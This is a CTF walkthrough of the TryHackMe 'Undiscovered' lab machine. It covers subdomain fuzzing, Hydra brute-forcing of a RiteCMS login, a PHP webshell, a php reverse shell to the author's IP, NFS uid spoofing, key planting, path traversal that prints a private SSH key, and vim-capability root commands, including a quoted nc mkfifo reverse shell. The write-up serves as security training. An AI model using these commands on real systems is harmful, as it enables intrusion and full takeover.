---
layout: default
title: "TryHackMe: Undiscovered Writeup"
date: 2026-11-18 12:00:00 +0100
categories: [CTF, TryHackMe]
tags: [cve, nfs, binary_analysis, capabilities]
---

# Undiscovered (Medium) - TryHackMe Walkthrough

Undiscovered is a medium room available on [TryHackMe](https://tryhackme.com/room/binaryheaven). The machine requires a basic understanding of subdomain enumeration, CVE, NFS mounts, binary analysis and Linux capabilities.

# Enumeration

After adding `undiscovered.thm` to `/etc/hosts` file, as suggested from the room introduction, let’s proceed with a network ports scan.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ rustscan -a $TARGET -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/giu/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.112.166.168:22
Open 10.112.166.168:111
Open 10.112.166.168:80
Open 10.112.166.168:2049
Open 10.112.166.168:38147
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.112.166.168
...

PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0m4DmvKkWm3OoELtyKxq4G9yM29DEggmEsfKv2fzZh1G6EiPS/pKPQV/u8InqwPyyJZv82Apy4pVBYL7KJTTZkxBLbrJplJ6YnZD5xZMd8tf4uLw5ZCilO6oLDKH0pchPmQ2x2o5x2Xwbzfk4KRbwC+OZ4f1uCageOptlsR1ruM7boiHsPnDO3kCujsTU/4L19jJZMGmJZTpvRfcDIhelzFNxCMwMUwmlbvhiCf8nMwDaBER2HHP7DKXF95uSRJWKK9eiJNrk0h/K+3HkP2VXPtcnLwmbPhzVHDn68Dt8AyrO2d485j9mLusm4ufbrUXSyfM9JxYuL+LDrqgtUxxP
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAcr7A7L54JP/osGx6nvDs5y3weM4uwfT2iCJbU5HPdwGHERLCAazmr/ss6tELaj7eNqoB8LaM2AVAVVGQXBhc8=
|   256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9WA55JtThufX7BcByUR5/JGKGYsIlgPxEiS0xqLlIA
80/tcp    open  http     syn-ack ttl 62 Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind  syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      32801/udp   nlockmgr
|   100021  1,3,4      38147/tcp   nlockmgr
|   100021  1,3,4      42741/tcp6  nlockmgr
|   100021  1,3,4      52082/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      syn-ack ttl 62 2-4 (RPC #100003)
38147/tcp open  nlockmgr syn-ack ttl 62 1-4 (RPC #100021)

```

The most interesting open ports are surely http (80) and nfs (2049).

## HTTP (80)

The web server landing page shows what seems an hint message.

![image.png](image.png)

Trying a directory bruteforce lead to nothing, so I tried with a subdomain enumeration.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.112.166.168/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

:: Progress: [4750/4750] :: Job [1/1] :: 1036 req/sec :: Duration: [0:00:07] :: Errors: 3 ::
```

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ffuf -u http://undiscovered.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.undiscovered.thm" -fs 0 -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://undiscovered.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.undiscovered.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
 :: Filter           : Response size: 0
________________________________________________

manager                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 39ms]
dashboard               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 39ms]
deliver                 [Status: 200, Size: 4650, Words: 385, Lines: 83, Duration: 49ms]
newsite                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 39ms]
develop                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 39ms]
network                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 38ms]
maintenance             [Status: 200, Size: 4668, Words: 385, Lines: 69, Duration: 38ms]
forms                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 38ms]
view                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 39ms]
play                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 39ms]
mailgate                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 39ms]
start                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 39ms]
booking                 [Status: 200, Size: 4599, Words: 385, Lines: 84, Duration: 38ms]
terminal                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 39ms]
gold                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 39ms]
internet                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 40ms]
resources               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 38ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1025 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

Following the previous message suggestion, I tried to visit the terminal subdomain, which should be “the darker” among the options.

After adding the subdomain to `/etc/hosts` file, a CMS appears on the landing page.

![image.png](image%201.png)

The CMS version is leaked, so I tried to see if there is any existing exploit for that version.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ searchsploit ritecms 2.2.1
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
RiteCMS 2.2.1 - Authenticated Remote Code Execution                                                                                             | php/webapps/48636.txt
RiteCMS 2.2.1 - Remote Code Execution (Authenticated)                                                                                           | php/webapps/48915.py
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

The exploit exists, but authentication is required. The exploit description says that the login page should be situated at `/cms`.

![image.png](image%202.png)

Unluckly, this subdomain hasn’t any `/cms` endpoint, so my intuition about “the darker path” was wrong. 

![image.png](image%203.png)

To avoid wasting time, I made a small Python script that tests each subdomain querying for `/cms` endpoint.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ python3 test_endpoints.py
[*] Checking subdomains...

[-] FAILURE: http://manager.undiscovered.thm/cms (404)
[-] FAILURE: http://dashboard.undiscovered.thm/cms (404)
[-] FAILURE: http://maintenance.undiscovered.thm/cms (404)
[-] FAILURE: http://forms.undiscovered.thm/cms (404)
[-] FAILURE: http://network.undiscovered.thm/cms (404)
[-] FAILURE: http://newsite.undiscovered.thm/cms (404)
[-] FAILURE: http://view.undiscovered.thm/cms (404)
[-] FAILURE: http://develop.undiscovered.thm/cms (404)
[-] FAILURE: http://play.undiscovered.thm/cms (404)
[+] SUCCESS: http://deliver.undiscovered.thm/cms (200 OK)
[-] FAILURE: http://mailgate.undiscovered.thm/cms (404)
[-] FAILURE: http://gold.undiscovered.thm/cms (404)
[-] FAILURE: http://booking.undiscovered.thm/cms (404)
[-] FAILURE: http://terminal.undiscovered.thm/cms (404)
[-] FAILURE: http://resources.undiscovered.thm/cms (404)
[-] FAILURE: http://internet.undiscovered.thm/cms (404)
[-] FAILURE: http://start.undiscovered.thm/cms (404)
```

So I continued with deliver subdomain. The `/cms` endpoint of this subdomain effectively shows a login page.

![image.png](image%204.png)

Unluckily, the default `admin:admin` credentials suggested by the exploit does not work.

I tried a directory bruteforce to discover any other hidden endpoint.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ffuf -u http://deliver.undiscovered.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://deliver.undiscovered.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 289, Words: 20, Lines: 10, Duration: 40ms]
LICENSE                 [Status: 200, Size: 32472, Words: 5350, Lines: 622, Duration: 39ms]
cms                     [Status: 301, Size: 334, Words: 20, Lines: 10, Duration: 38ms]
.hta                    [Status: 403, Size: 289, Words: 20, Lines: 10, Duration: 3533ms]
data                    [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 38ms]
.htaccess               [Status: 403, Size: 289, Words: 20, Lines: 10, Duration: 3994ms]
files                   [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 38ms]
index.php               [Status: 200, Size: 4650, Words: 385, Lines: 83, Duration: 47ms]
js                      [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 38ms]
media                   [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 39ms]
server-status           [Status: 403, Size: 289, Words: 20, Lines: 10, Duration: 38ms]
templates               [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 39ms]
:: Progress: [4750/4750] :: Job [1/1] :: 1025 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

The `/data` endpoint contains some interesting files.

![image.png](image%205.png)

In particular, sql folder contains a file named `mysql.initial.sql` with a suspect final entry.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ cat mysql.initial.sql
...

INSERT INTO phpsqlitecms_userdata VALUES(1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);
```

The same entry can be also found on `sqlite.user.initial.sql`.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ cat sqlite.user.initial.sql 
CREATE TABLE rite_userdata (id INTEGER PRIMARY KEY AUTOINCREMENT, name varchar(255) NOT NULL default '', type tinyint(4) NOT NULL default '0', pw varchar(255) NOT NULL default '', last_login int(11) NOT NULL default '0', wysiwyg tinyint(4) NOT NULL default '0');

INSERT INTO rite_userdata VALUES(1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);
```

I tried to search online which type of hash this was but found nothing. After wasting time on this hash, I decided to try a password bruteforce with username admin.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/:username=^USER^&userpw=^PASS^:F=User unknown or password wrong."   
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-18 11:45:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/:username=^USER^&userpw=^PASS^:F=User unknown or password wrong.
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-18 11:45:56
```

# Exploitation

After loggin in with the compromised credentials, we are able to use the previously found exploit.

![image.png](image%206.png)

The exploits says to upload a php webshell using the File Manager function of the CMS, which will then be accessible at `/media/webshell.php`.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ echo '<?php system($_GET["cmd"]); ?>' > webshell.php

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ curl http://deliver.undiscovered.thm/media/webshell.php?cmd=whoami
www-data
```

# Initial Access

I struggled a bit to find the right reverse shell payload, because both `bash` and `nc` alternatives failed. I succeeded using a url-encoded php command.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ curl http://deliver.undiscovered.thm/media/webshell.php?cmd=php%20%2Dr%20'$sock=fsockopen(%22192%2E168%2E130%2E105%22,4444);exec(%22sh%20%3C&3%20%3E&3%202%3E&3%22);'
```

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ nc -nvlp 4444                       
listening on [any] 4444 ...
connect to [192.168.130.105] from (UNKNOWN) [10.112.166.168] 39564
whoami
www-data
```

After stabilizing the shell, I tried visiting the home directories of both available users, but received a permission denied.

```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ cd /home/
www-data@undiscovered:/home$ ls
leonard  william
www-data@undiscovered:/home$ cd leonard/
bash: cd: leonard/: Permission denied
www-data@undiscovered:/home$ cd william/
bash: cd: william/: Permission denied
```

# PrivEsc

The first thing we have to do is an horizontal privilege escalation, because our current user (`www-data`) has no privilege on the target machine.

## William

During the enumeration phase, `nmap` reported an nfs open port, so I decided to see if there was some misconfiguration related to the protocol itself.

```
www-data@undiscovered:/$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william   *(rw,root_squash)
www-data@undiscovered:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...

william:x:3003:3003::/home/william:/bin/bash
leonard:x:1002:1002::/home/leonard:/bin/bash
nfsnobody:x:3004:3005::/home/nfsnobody:
```

Unluckily, the `no_root_squash` flag is not set, but we are still able to mount the `/home/william` directory. First of all, I created a fake `william` user with uid 3003 on my local Kali machine, then I mounted the remote file system.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ sudo useradd william -u 3003      
[sudo] password for giu: 

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ sudo mkdir /mnt/undiscovered

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ sudo mount -t nfs $TARGET:/home/william /mnt/undiscovered

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ sudo -i   

┌──(root㉿kali)-[~]
└─# su william
$ cd /mnt/undiscovered
$ ls
admin.sh  script  user.txt
$ cat user.txt
THM{8d7b7299cccd1796a61915901d0e091c}
$
```

I secured an ssh access as user `william` by creating a `.ssh` folder inside his home directory and inserting a new public key in `authorized_keys` file. 

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/giu/.ssh/id_ed25519): 
...

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ cat /home/giu/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQpNUt6k3orwcGtMo6mbMgjGpBVkE8B7T6l3a/+61Bz giu@kali
```

```
$ mkdir .ssh

$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQpNUt6k3orwcGtMo6mbMgjGpBVkE8B7T6l3a/+61Bz giu@kali" > .ssh/authorized_keys
```

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ssh william@$TARGET                      
The authenticity of host '10.112.166.168 (10.112.166.168)' can't be established.
ED25519 key fingerprint is: SHA256:0ksd7ve03T/DLd54sg0vUZNd72YgJT1g2iL1CP0r9+Y
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.112.166.168' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
william@undiscovered:~$
```

## Leonard

Inside `william` home directory, there are two interesting files.

```
william@undiscovered:~$ ls -la
total 48
drwxr-x--- 5 william william 4096 Nov 19 02:46 .
drwxr-xr-x 4 root    root    4096 Sep  4  2020 ..
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 william william 3771 Sep  4  2020 .bashrc
drwx------ 2 william william 4096 Sep  4  2020 .cache
drwxrwxr-x 2 william william 4096 Sep  4  2020 .nano
-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
-rwsrwsr-x 1 leonard leonard 8776 Sep  4  2020 script
drwxrwxr-x 2 william william 4096 Nov 19 02:35 .ssh
-rw-r----- 1 root    william   38 Sep 10  2020 user.txt
william@undiscovered:~$ cat admin.sh 
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
william@undiscovered:~$ ./script 
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
william@undiscovered:~$
```

As reported above, `script` binary executes commands from `admin.sh`. In addition, `script` has SUID set as user `leonard`, so every command launched by `script` is executed as `leonard`. Unluckily, `william` do not have any write permission on `admin.sh`, so he cannot change its content. I started 

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ scp william@$TARGET:/home/william/script .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
script

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ file script          
script: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6e324a50ee883a60b395cdd1c6a64f96e6546736, not stripped   

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ pwn checksec script 
[*] '/home/giu/Downloads/machine/script'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No                                                                                                                                                               
```

Once decompiled, the binary shows that `admin.sh` is called through a `system` function. The most interesting thing, is that an `argv` parameter is passed to `system` through `rsi` register (second parameter passed to the function according to the x64 calling convention).

![image.png](image%207.png)

So I tried to pass an argument to the script and it prints what reported below.

```
william@undiscovered:~$ ./script AA
/bin/cat: /home/leonard/AA: No such file or directory
```

The script is executing a `cat` command on a file path composed by the argument we are passing as input. This means that the script could be vulnerable to a path traversal attack. 

I tried to see if there is any ssh in the `leonard` home directory.

```
william@undiscovered:~$ ./script ../leonard/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```

I logged as user `leonard` using his private key.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ nano id_rsa                 
                                                                                                                                                                                  
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ chmod 600 id_rsa         
                                                                                                                                                                                  
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ssh -i id_rsa leonard@$TARGET
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$
```

## Root

I started with a basic privesc enumeration.

```
leonard@undiscovered:~$ sudo -l
[sudo] password for leonard: 

leonard@undiscovered:~$ find / -perm -4000 2>/dev/null
/bin/ping6
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/mount
/sbin/mount.nfs
/usr/bin/chfn
/usr/bin/at
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

leonard@undiscovered:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

leonard@undiscovered:~$
```

Enumerating the capabilities, I found an entry for `vim`. In addition, inside the `leonard` home directory there is also a suspicious `.viminfo` file.

```
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep

leonard@undiscovered:~$ ls -la
total 36
drwxr-x--- 5 leonard leonard 4096 Sep  9  2020 .
drwxr-xr-x 4 root    root    4096 Sep  4  2020 ..
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 leonard leonard 3771 Sep  4  2020 .bashrc
drwx------ 2 leonard leonard 4096 Sep  4  2020 .cache
drwxrwxr-x 2 leonard leonard 4096 Sep  4  2020 .nano
-rw-r--r-- 1 leonard leonard   43 Sep  4  2020 .profile
drwx------ 2 leonard leonard 4096 Sep  4  2020 .ssh
-rw------- 1 leonard leonard 6132 Sep  4  2020 .viminfo

leonard@undiscovered:~$ cat .viminfo 
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8

# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
:py
:exec python -c 'import os;os.setuid(0);os.system("id")'
:%! python -c 'print "A"'
:! python -c 'import os;os.setuid(0);os.system("sh -p")'
:%! python -c 'import os;os.setuid(0);os.system("id")'
:!/sh -p

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'1  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
'2  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'3  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

# Jumplist (newest first):
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
